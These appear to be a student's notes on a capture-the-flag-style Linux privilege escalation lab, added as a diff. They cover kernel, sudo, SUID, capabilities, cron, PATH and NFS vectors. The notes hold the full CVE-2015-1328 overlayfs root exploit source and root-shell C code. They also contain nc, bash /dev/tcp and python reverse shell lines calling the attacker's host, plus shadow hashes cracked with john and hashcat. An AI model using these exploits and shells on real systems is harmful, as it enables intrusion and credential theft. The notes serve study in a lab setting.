@@ -1,0 +1,812 @@
+task5
+The Kernel exploit methodology is simple;
+
+    Identify the kernel version
+    Search and find an exploit code for the kernel version of the target system
+    Run the exploit 
+
+Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
+
+
+Research sources:
+
+    Based on your findings, you can use Google to search for an existing exploit code.
+    Sources such as https://www.linuxkernelcves.com/cves can also be useful.
+    Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
+
+Hints/Notes:
+
+    Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
+    Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
+    Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
+    You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.
+
+5.1 search for  CVE-2015-1328
+https://github.com/0x1ns4n3/CVE-2015-1328-GoldenEye
+
+about exploit:
+
+The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.
+
+5.2
+the file code:
+/*
+# Exploit Title: ofs.c - overlayfs local root in ubuntu
+# Date: 2015-06-15
+# Exploit Author: rebel
+# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
+# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
+# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)
+
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+CVE-2015-1328 / ofs.c
+overlayfs incorrect permission handling + FS_USERNS_MOUNT
+
+user@ubuntu-server-1504:~$ uname -a
+Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
+user@ubuntu-server-1504:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
+user@ubuntu-server-1504:~$ ./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)
+
+greets to beist & kaliman
+2015-05-24
+%rebel%
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <string.h>
+#include <linux/sched.h>
+
+#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"
+
+static char child_stack[1024*1024];
+
+static int
+child_exec(void *stuff)
+{
+    char *file;
+    system("rm -rf /tmp/ns_sploit");
+    mkdir("/tmp/ns_sploit", 0777);
+    mkdir("/tmp/ns_sploit/work", 0777);
+    mkdir("/tmp/ns_sploit/upper",0777);
+    mkdir("/tmp/ns_sploit/o",0777);
+
+    fprintf(stderr,"mount #1\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
+// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
+            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
+            exit(-1);
+        }
+        file = ".access";
+        chmod("/tmp/ns_sploit/work/work",0777);
+    } else file = "ns_last_pid";
+
+    chdir("/tmp/ns_sploit/o");
+    rename(file,"ld.so.preload");
+
+    chdir("/");
+    umount("/tmp/ns_sploit/o");
+    fprintf(stderr,"mount #2\n");
+    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
+        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
+            exit(-1);
+        }
+        chmod("/tmp/ns_sploit/work/work",0777);
+    }
+
+    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
+    umount("/tmp/ns_sploit/o");
+}
+
+int
+main(int argc, char **argv)
+{
+    int status, fd, lib;
+    pid_t wrapper, init;
+    int clone_flags = CLONE_NEWNS | SIGCHLD;
+
+    fprintf(stderr,"spawning threads\n");
+
+    if((wrapper = fork()) == 0) {
+        if(unshare(CLONE_NEWUSER) != 0)
+            fprintf(stderr, "failed to create new user namespace\n");
+
+        if((init = fork()) == 0) {
+            pid_t pid =
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+            if(pid < 0) {
+                fprintf(stderr, "failed to create new mount namespace\n");
+                exit(-1);
+            }
+
+            waitpid(pid, &status, 0);
+
+        }
+
+        waitpid(init, &status, 0);
+        return 0;
+    }
+
+    usleep(300000);
+
+    wait(NULL);
+
+    fprintf(stderr,"child threads done\n");
+
+    fd = open("/etc/ld.so.preload",O_WRONLY);
+
+    if(fd == -1) {
+        fprintf(stderr,"exploit failed\n");
+        exit(-1);
+    }
+
+    fprintf(stderr,"/etc/ld.so.preload created\n");
+    fprintf(stderr,"creating shared library\n");
+    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
+    write(lib,LIB,strlen(LIB));
+    close(lib);
+    lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+    if(lib != 0) {
+        fprintf(stderr,"couldn't create dynamic library\n");
+        exit(-1);
+    }
+    write(fd,"/tmp/ofs-lib.so\n",16);
+    close(fd);
+    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
+    execl("/bin/su","su",NULL);
+}
+
+
+5.3 build and expose the file:
+#!/bin/bash
+cc exploit.c -o exploit
+python3 -m http.server 6969
+ 
+
+
+
+
+
+task6
+Any user can check its current situation related to root privileges using the sudo -l command.
+
+https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
+
+Leverage application functions
+
+Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.
+
+In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).
+
+
+Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.
+
+Leverage LD_PRELOAD
+
+On some systems, you may see the LD_PRELOAD environment option.
+
+
+LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
+
+The steps of this privilege escalation vector can be summarized as follows;
+
+    Check for LD_PRELOAD (with the env_keep option)
+    Write a simple C code compiled as a share object (.so extension) file
+    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
+The C code will simply spawn a root shell and can be written as follows;
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+
+We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
+
+We need to run the program by specifying the LD_PRELOAD option, as follows;
+
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+
+This will result in a shell spawn with root privileges. 
+
+6.1 chek the sudo -l output:
+karen@ip-10-10-236-121:/tmp$ sudo -l
+Matching Defaults entries for karen on ip-10-10-236-121:
+    env_reset, env_keep+=LD_PRELOAD, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User karen may run the following commands on ip-10-10-236-121:
+    (ALL) NOPASSWD: /usr/bin/find
+    (ALL) NOPASSWD: /usr/bin/less
+    (ALL) NOPASSWD: /usr/bin/nano
+
+
+6.2 use sudo less command to get the access to all files
+
+
+task7: 
+7.1. run find to list all files  with SUID flag set:
+
+karen@ip-10-10-58-182:/$ find / -type f -perm -04000 -ls 2>/dev/null
+    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
+     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
+     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
+     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
+     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
+     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
+     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
+     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
+     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
+     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
+     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
+     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
+     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
+     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
+
+7.2 base64 can be used to read any fiels with root proveleges:
+
+karen@ip-10-10-58-182:/$ /usr/bin/base64 /etc/shadow | base64 -d
+root:*:18561:0:99999:7:::
+gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
+user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
+karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
+
+karen@ip-10-10-58-182:/$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
+user2:x:1002:1002::/home/user2:/bin/sh
+
+7.3. identify the hash type: 
+kali@kali:~$ hashid -m '$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/'
+Analyzing '$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/'
+[+] SHA-512 Crypt [Hashcat Mode: 1800]
+
+7.4 try to crack the password using john-ripper and hashcat. 
+
+7.5 for john-ripper create a file:
+/usr/bin/base64 /etc/shadow | base64 -d > shadow.txt
+unshadow /etc/passwd shadow.txt > passwords.txt
+
+cat passwd:
+gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
+user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
+karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
+
+7.6 run joh-ripper: 
+
+ali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:02 0.01% (ETA: 01:16:48) 0g/s 428.7p/s 1408c/s 1408C/s hawaii..bethany
+Password1        (karen)     
+Password1        (user2)     
+test123          (gerryconway)     
+3g 0:00:00:17 DONE (2023-02-17 15:32) 0.1694g/s 997.9p/s 1402c/s 1402C/s 111292..ellie123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+7.7 try hashcat. 
+create a file with hashes:
+kali@kali:~/tools$ cat ../hash2 
+$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/
+$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
+$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/
+
+run hashcat:
+kali@kali:~$ hashcat -m 1800 -a 0 hash2 /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-AMD Ryzen 7 3700X 8-Core Processor, 1441/2947 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 3 digests; 3 unique digests, 3 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Uses-64-Bit
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:Password1
+$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:Password1
+$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:test123
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: hash2
+Time.Started.....: Fri Feb 17 15:42:19 2023 (27 secs)
+Time.Estimated...: Fri Feb 17 15:42:46 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      903 H/s (6.65ms) @ Accel:64 Loops:512 Thr:1 Vec:2
+Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
+Progress.........: 52672/43033155 (0.12%)
+Rejected.........: 0/52672 (0.00%)
+Restore.Point....: 17536/14344385 (0.12%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: 111292 -> newcastle1
+Hardware.Mon.#1..: Util: 93%
+
+Started: Fri Feb 17 15:42:17 2023
+Stopped: Fri Feb 17 15:42:48 2023
+
+
+
+ 
+
+
+
+
+task8:
+8.1. run getcap to find SUID capabilitis:
+
+karen@ip-10-10-255-173:~$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+
+8.2. Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
+karen@ip-10-10-255-173:~$ ls -l /home/karen/vim 
+-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim
+
+8.3. run vim with command which will start root shell
+karen@ip-10-10-255-173:~$ /home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+Erase is control-H (^H).
+
+8.4. get the flag:
+
+# id
+uid=0(root) gid=1001(karen) groups=1001(karen)
+# cd /home/ubuntu
+# ls
+flag4.txt  view
+# cat flag4.txt
+THM-9349843
+#                                                                                          
+# exit
+karen@ip-10-10-255-173:~$ 
+
+
+task9
+
+Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
+
+    System administrators need to run a script at regular intervals.
+    They create a cron job to do this
+    After a while, the script becomes useless, and they delete it
+    They do not clean the relevant cron job
+
+
+9.1 check crotab and see if we can access it:
+
+karen@ip-10-10-73-68:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+
+9.2 check the files: 
+karen@ip-10-10-73-68:~$ cat /home/karen/backup.sh
+
+#!/bin/bash
+cd /home/admin/1/2/3/Results
+zip -r /home/admin/download.zip ./*
+karen@ip-10-10-73-68:~$ ls -l /home/karen/backup.sh
+
+-rw-r--r-- 1 karen karen 77 Jun 20  2021 /home/karen/backup.sh
+
+karen@ip-10-10-73-68:~$ ls -l /tmp/test.py
+ls: cannot access '/tmp/test.py': No such file or directory
+
+so we can adjust existing shell script  /home/karen/backup.sh or create a python script /tmp/test.py
+
+
+9.3 add a reverse shell to /home/karen/backup.sh
+
+nc -e /bin/sh 10.10.0.5 4444
+
+or
+
+bash -i >& /dev/tcp/10.10.0.5/4444 0>&1
+
+changr the execution bit:
+karen@ip-10-10-73-68:~$ chmod 777 /home/karen/backup.sh
+karen@ip-10-10-73-68:~$ ls -l /home/karen/backup.sh
+
+
+
+9.4 start on remote server:
+kali@kali:~$ nc -lnvp 4444
+listening on [any] 4444 ...
+
+
+connect to [10.8.74.125] from (UNKNOWN) [10.10.73.68] 57526
+bash: cannot set terminal process group (12679): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ip-10-10-73-68:~# 
+root@ip-10-10-73-68:~# 
+root@ip-10-10-73-68:~# 
+root@ip-10-10-73-68:~# id                      
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@ip-10-10-73-68:/home/ubuntu# cat flag5.txt
+cat flag5.txt
+THM-383000283
+
+
+9.5 add python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+9.6 check /etc/shadow
+
+karen:$6$ZC4srkt5HufYpAAb$GVDM6arO/qQU.o0kLOZfMLAFGNHXULH5bLlidB455aZkKrMvdB1upyMZZzqdZuzlJTuTHTlsKzQAbSZJr9iE21:18798:0:99999:7:::
+matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
+
+kali@kali:~/tools$ hashcat -m 1800 -a 0 '$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+....
+
+$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:123456
+
+
+task10
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).
+
+Typically the PATH will look like this:
+
+
+If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
+
+    What folders are located under $PATH
+    Does your current user have write privileges for any of these folders?
+    Can you modify $PATH?
+    Is there a script/application you can start that will be affected by this vulnerability?
+
+For demo purposes, we will use the script below:
+
+#include <unistd.h>
+void main()
+{ setuid(0);
+  setguid(0);
+  system("thm");
+
+
+This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary. we compile this into an executable and set the SUID bit.
+
+gcc path-expl.c -o path  -w
+chmod u+s path
+
+Our user now has access to the “path” script with SUID bit set. Once executed “path” will look for an executable named “thm” inside folders listed under PATH.
+
+
+If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege
+
+A simple search for writable folders can done using the “find / -writable 2>/dev/null” command. The output of this command can be cleaned using a simple cut and sort sequence.
+
+Some CTF scenarios can present different folders but a regular system would output something like we see above.
+
+Comparing this with PATH will help us find folders we could use.
+
+We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.
+
+An alternative could be the command below.
+
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+We have added “grep -v proc” to get rid of the many results related to running processes.
+
+
+Unfortunately, subfolders under /usr are not writable
+
+The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “export PATH=/tmp:$PATH” command accomplishes this.
+
+At this point the path script will also look under the /tmp folder for an executable named “thm”.Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.
+
+We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges. 
+
+10.1 verify the PATH command
+karen@ip-10-10-189-89:/home/murdoch$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+and find all writables in /home:
+
+karen@ip-10-10-189-89:/home/murdoch$ find / -writable 2>/dev/null | grep "home"| cut -f 2,3 -d "/" | sort -u 
+home/murdoch
+
+karen@ip-10-10-189-89:/home/murdoch$ ls -l /home/murdoch
+total 28
+-rwsr-xr-x 1 root  root  16712 Jun 20  2021 test
+-rw-rw-r-- 1 root  root     86 Jun 20  2021 thm.py
+
+10.2 script ./test  with SetUID bit and tries to execute the programm thm:
+karen@ip-10-10-189-89:/home/murdoch$ ./test 
+sh: 1: thm: not found
+
+10.3 create the file thm with simle line "/bin/bash" :
+karen@ip-10-10-189-89:/home/murdoch$ echo "/bin/bash" > thm
+karen@ip-10-10-189-89:/home/murdoch$ ls -l
+total 28
+-rwsr-xr-x 1 root  root  16712 Jun 20  2021 test
+-rw-rw-r-- 1 karen karen    10 Feb 17 22:50 thm
+-rw-rw-r-- 1 root  root     86 Jun 20  2021 thm.py
+karen@ip-10-10-189-89:/home/murdoch$ chmod 777 thm
+karen@ip-10-10-189-89:/home/murdoch$ ls -l
+total 28
+-rwsr-xr-x 1 root  root  16712 Jun 20  2021 test
+-rwxrwxrwx 1 karen karen    10 Feb 17 22:50 thm
+-rw-rw-r-- 1 root  root     86 Jun 20  2021 thm.py
+
+
+10.5 add the directory to the PATH and execute the ./test programm:
+
+karen@ip-10-10-189-89:/home/murdoch$ export PATH=/home/murdoch/:$PATH
+
+karen@ip-10-10-189-89:/home/murdoch$ ./test 
+root@ip-10-10-189-89:/home/murdoch# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+root@ip-10-10-189-89:/home/murdoch# cat /home/matt/flag6.txt 
+THM-736628929
+
+
+
+
+task11
+he critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+We will start by enumerating mountable shares from our attacking machine.
+
+showmount -e
+mount -o rw 1.2.3.4::/backup /tmp/nfsbackup
+
+create a program:
+
+int main()
+{ setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+
+set SUID bit
+gcc nfc.c -o nfs -w
+chmod u+s nfs
+
+
+11.1  check nfs from the attack server:
+
+kali@kali:~$ showmount -e 10.10.183.223
+Export list for 10.10.183.223:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+
+
+check the exports on the attacking server:
+karen@ip-10-10-183-223:/$ cat /etc/exports 
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+
+11.2 select the NFS with no_root_squash option, for example/home/ubuntu/sharedfolder (because we don'T have permissiond for  /home/backup  on attacked server) and mount it under /tmp on the attck server
+
